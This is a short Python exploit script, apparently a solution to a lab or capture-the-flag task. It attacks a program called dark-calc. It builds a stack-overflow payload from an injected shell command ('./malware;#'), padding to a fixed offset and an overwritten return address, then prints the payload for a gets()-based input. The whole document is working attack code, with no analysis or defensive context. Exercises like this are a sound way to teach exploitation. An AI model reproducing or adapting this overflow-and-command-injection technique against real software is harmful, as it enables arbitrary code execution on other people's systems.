#!/usr/bin/env python3
"""Task 2: use the stack overflow in dark-calc to run ./malware."""
import struct
import sys
COMMAND = b"./malware;#"
OFFSET = 0x18
TARGET = 0x401A6B
payload = COMMAND + b"A" * (OFFSET - len(COMMAND)) + struct.pack("<Q", TARGET)
assert len(payload) == OFFSET + 8
assert b"\n" not in payload  # gets() stops at a newline
sys.stdout.buffer.write(payload)